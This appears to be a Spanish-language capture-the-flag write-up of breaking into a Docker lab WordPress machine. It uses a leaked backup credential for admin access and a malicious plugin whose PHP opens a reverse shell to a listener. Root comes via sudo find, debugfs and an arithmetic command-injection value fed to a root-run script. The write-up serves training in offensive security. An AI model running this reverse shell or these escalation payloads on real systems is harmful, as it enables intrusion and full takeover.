*En principio desplegando la máquina con docker, nos devuelve  la IP 172.18.0.2*

Utilizamos el comando nmap adjunto
```
sudo nmap -p- --min-rate=5000 -T5 172.18.0.2
```

![Nmap](Pasted%20image%2020260929185003.png)

*Encontramos el puerto 80 open.*

---

Entrando al sitio web de la dirección IP obtenida, vemos esta página, pero no permite interacción alguna.
![Página web](Pasted%20image%2020260929185111.png)

*Entonces procedemos a realizar un comando gobuster, que dejamos en adjunto:*

```
gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt 
```

Este comando nos trajo varios puntos descubiertos para interactuar con la página.
Los dejamos en adjunto

![Gobuster](Pasted%20image%2020260929185627.png)

---

*Procedemos a entrar en los resultados obtenidos*

Por ejemplo en http://172.18.0.2/wp-includes la página pasa a mostrar la siguiente información:

![wp-includes](Pasted%20image%2020260929185929.png)

En la  http://172.18.0.2/wp-admin nos encontramos con:

![wp-admin](Pasted%20image%2020260920190053.png)

Intentamos hacer un bypass del login, pero el resultado fue negativo, como lo adjuntamos a continuación:

![Bypass fallido](Pasted%20image%2020260920190159.png)

Proseguimos con http://172.18.0.2/backups donde nos muestra la información:

![Backups](Pasted%20image%2020260920190306.png)

Logramos obtener el zip que contiene la página en ese apartado y proseguimos a ver que contiene

![Contenido del backup](Pasted%20image%2020260920190404.png)

*Realizamos el comando unzip sobre el archivo y obtenemos lo siguiente:*

![Archivos extraídos](Pasted%20image%2020260920190929.png)

---
Usuario: developer
Password: 2wmy3KrGDRD%RsA7Ty5n71L^

---

Vamos a probar si con dicho usuario y contraseña podemos ingresar en el sector de login donde quisimos realizar el bypass hoy

Logramos ingresar al sitio para continuar la evaluación:

![Login](Pasted%20image%2020260920191200.png)


Nos encontramos con nuevas opciones dentro de la página principal.

![Panel principal](Pasted%20image%2020260920191251.png)

![Opciones](Pasted%20image%2020260920191326.png)

---

Dentro de la página descubrimos el apartado de Plugins, como somos admin bajo el usuario "developer" podemos ingresar un nuevo plugin donde lo que vamos a buscar es obtener una reverse shell por medio del siguiente php

```
<?php
/*
Plugin Name: Exploit Lab PHP Nativo
Description: Shell reversa usando funciones puras de PHP.
Version: 1.0
Author: Tester
*/

// Recuerda cambiar 172.18.0.1 por la IP de tu interfaz de Docker (la pasarela)
exec("php -r '\$sock=fsockopen(\"172.18.0.1\",4444);exec(\"sh <&3 >&3 2>&3\");' &");
?>
```

Lo guardamos bajo el nombre shell.php y dentro de la carpeta exploit-final la cual luego debimos *zippear*  con el comando:

```
zip -r exploit-final.zip exploit-final
```

Fuimos a la página donde subimos el Plugin nuevo.
Antes de activarlo es importante dejar el puerto configurado dentro del php en escucha, con el siguiente comando:

```
nc -lvnp 4444
```

En ese instante al activar el plugin la página quedó en este loop:

![Plugin activado](Pasted%20image%2020260920201815.png)

Por otro lado en la terminal que pusimos en escucha el puerto, nos daba los primeros indicios de conexión:

![Reverse shell](Pasted%20image%2020260920201927.png)

Bueno en está instancia dentro de una reverse shell, podemos operar buscando como escalar privilegios, de está manera encontramos lo siguiente:

![Escalada inicial](Pasted%20image%2020260920202047.png)

Existe un usuario *rafa* el cual tiene privilegios de ejecutar el /usr/bin/find, por lo cual nos vamos a la página de GTFObins donde encontramos la siguiente manera de escalar dicho privilegio:

```
sudo -u rafa find . -exec /bin/sh \; -quit
```

Obteniendo entonces:
---

![Usuario rafa](Pasted%20image%2020260920202256.png)

Cuando nos convertimos en *rafa* nos mostró que aún él no tenía todos los permisos para escalar directo a ==root==

Pero desde *rafa* podemos escalar a *ruben* un nuevo usuario el cual nos abre otro camino.

Entonces, buscamos nuevamente en ==GTFObins== como explotar esa vulnerabilidad, nos encontramos con:

```
sudo -u ruben debugfs = primera instancia

!/bin/sh = segunda instancia

debugfs:  !/bin/bash 
```

Una vez nos convertimos en *ruben*, vemos con ==sudo -l==:

![sudo de ruben](Pasted%20image%2020260920202834.png)

---
Lo hallado es un script, si se observa bien está alojado en /opt/penguin.sh

Acá lo que hacemos es ver el contenido del mismo

![penguin.sh](Pasted%20image%2020260920203000.png)

---

Lo que nos dice es: Sí el valor "num" ingresado es igual a 42, la respuesta es "Correct"

O sea, si logramos encontrar un "num" igual a 42 obtenemos una devolución positiva, por lo que entendimos es la siguiente forma de escalar los privilegios, entonces, que podemos ingresar que nos devuelva correct y a la vez nos permita subir a ==root==

Aquí encontramos el siguiente comando para luego de ejecutar el script nos permita el escalado de privilegios:

```
sudo /bin/bash /opt/penguin.sh

(Esto daba un espacio para ingresar el valor "num")

42+b[$(bash -p >&2)] 

Ese es nuestro "valor num" para poder escalar a una terminal como root
```

Consultamos a la IA sobre la definición de lo que hace ejecutar esa respuesta que dimos:

- 42+ = Satisface la condición matemática del script y que la validación de verdadera
- b[...] = Simula ser un array llamado "b", obliga a Bash a evaluar matemáticamente lo que hay dentro de los corchetes para calcular la posición del índice.
- $(...) = Ejecuta inmediatamente el comando de consola que está en su interior antes de continuar con la suma.
- bash -p = abre una nueva terminal de comandos. La opción "-p" es por privilegiada, asegura que seamos root.
- >&2 = Envía la salida de la nueva terminal a la pantalla (salida de errores estándar) para que puedas ver el prompt y escribir comandos de forma interactiva.

Entonces luego nos devuelve:

![Root](Pasted%20image%2020260920203445.png)

Corroboramos y somos ==root==!!
